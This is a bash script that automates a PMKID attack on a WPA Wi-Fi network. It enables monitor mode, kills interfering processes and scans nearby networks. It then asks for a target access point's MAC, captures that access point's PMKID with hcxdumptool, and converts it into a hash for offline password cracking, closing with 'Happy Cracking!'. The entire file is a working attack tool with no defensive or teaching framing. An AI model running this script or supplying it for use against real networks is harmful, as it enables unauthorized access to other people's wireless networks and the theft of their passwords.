#!/bin/bash

## CONSTANTS - Change if applicable ##
interfaceName="wlan0"

# Check for permissions
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root"
   exit 1
fi

cd

airmon-ng start $interfaceName

airmon-ng check kill

monInterfaceName=$interfaceName"mon"

sh -c "(sleep 15; killall 'airodump-ng') & exec airodump-ng $monInterfaceName"

read -p "Enter Station MAC address (no colons): " stationMAC

echo $stationMAC > filter.txt

hcxdumptool -o hashedPMKID -i $monInterfaceName --enable_status=1 --filtermode=2 --filterlist=filter.txt | grep -m 1 "FOUND PMKID CLIENT-LESS"

hcxpcaptool -z finalHash hashedPMKID

echo $'\n'

cat finalHash

echo $'\n'

echo "Happy Cracking!"
